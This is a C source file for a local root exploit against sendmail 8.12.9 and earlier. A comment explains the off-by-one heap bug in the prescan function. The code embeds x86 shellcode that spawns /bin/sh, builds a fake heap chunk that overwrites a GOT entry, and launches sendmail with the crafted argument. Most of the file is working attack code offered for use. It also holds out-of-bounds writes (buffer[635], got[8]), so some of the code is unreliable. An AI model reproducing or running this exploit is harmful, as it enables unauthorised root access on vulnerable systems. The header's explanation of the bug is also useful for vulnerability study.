/* Local exploit for the old sendmail vuln found by lcamtuf in 8.12.9 and below. 
 * by Gyan Chawdhary, gunnu45@hotmail.com
 * 
 * Greets
 * sorbo: all the credits go to him for the ideas regarding the exploitation..
 * lcamtuf: for finding such a subtle bug ..
 * dvorak, scut, gera ..
 * 
 * Theory
 * The problem lies in the prescan function. When returnnull is called it does
 * not do a check to see if p > addr. This results into p pointing past the 
 * array by one byte into the size field tag of the next malloc chunk 
 * ( due to the fact that bufp is allocated in the heap. This value is assigned
 * to *delimptr which is used by invalidaddr in parseaddr. The invalidaddr
 * function  checks for addresses containing characters used by macros. During
 * the parsing of the addrs by invalidaddr, it also checks for illegal chars 
 * in the adress itself, and if found they are replaced with 
 * BAD_CHAR_REPLACEMENT (depending on the size field of the allocation of our 
 * buffer) which is defined as "?" (hex 3f) Due to the offbyone overflow in 
 * prescan, invalidaddr modifies our chunk value which is later used by free()
 * when sm_free(bufp) is called, in return making sendmail vomit !!!!. 
 * Read the code for details.
 * 
 * Gyan
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char sc[] =
        "\xeb\x0a"
        "AAAAAAAAAA"
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

#define CHUNK_SIZE 635

/* This function creats the string with fd and bk pointers and  the shellcode.
 * Heap will look like this
 *---------------------------------------------------------------------
  size = 281|                    |size 23f|fd|bk|shellcode|BBBBBBBB
 ----------------------------------------------------------------------
 * When sm_free(bufp) is called it will consolidate the next buffer, and 
 * use the fd and bk fields with our value which will allow us to overwrite 
 */
 
char *xp_evilstring(int got, int retloc) 
{
	int s;
	char *ptr;
        static char buffer[635];
	ptr = buffer;
	*( (int **)ptr ) = (int *)( got - 12 );
	ptr+=4;
	*( (int **)ptr ) = (int *)( retloc );
	ptr+=4;
	*ptr = '\n';
	ptr++;
	
	/* The '\n' is used for allocating nother buffer in sendtolist by 
	 * denlstring which will copy our fake chunk and which will be later
	 * on consolidated while sm_free(bufp) is called.
	 */
	memcpy(ptr, sc, strlen(sc));
	ptr+=strlen(sc);
	memset(ptr, 'B', sizeof(buffer) - (strlen(sc)+4+4)); 
	/* Used for having the lsb to 0 so that free() will conolidate it with
	 * the other chunk
	 */
	buffer[635] = '\0';
	ptr = buffer;
	s = strlen(ptr);
//	printf("%d\n", s);
//	printf("%s\n", ptr);
	return ptr;	

	
}

/*GOT code*/

#define GREP 	"/bin/grep"
#define OBJDUMP "/usr/bin/objdump"
#define AWK 	"/bin/awk"

int xp_getgot(const char *filename, char *function)
{
	char command[512];
	FILE *file;
	char got[8];

	snprintf(command, sizeof(command), "%s -R %s | %s \"%s\" | %s '{print $1}               '", OBJDUMP, filename, GREP, function, AWK);

	file = (FILE *)popen(command, "r");	
	fgets(got, 11, file);
	pclose(file);
	got[8] = '\0';
	return (strtoul(got, NULL, 16));
}

char *sendmail ="/usr/sbin/sendmail";

main(int argv, char **argc)
{	
	char *c;
	int got = 0x080c1a90;
	int retloc = 0xC0000000 - 4- strlen(sendmail) -1 - strlen(sc)-1;
	
	char *arg[] = { "owned",NULL,sc, NULL };
	c = xp_evilstring(got, retloc);
	printf("%s\n", c);
	arg[1] = xp_evilstring(got, retloc);	
	execve(sendmail,arg,NULL);
}	
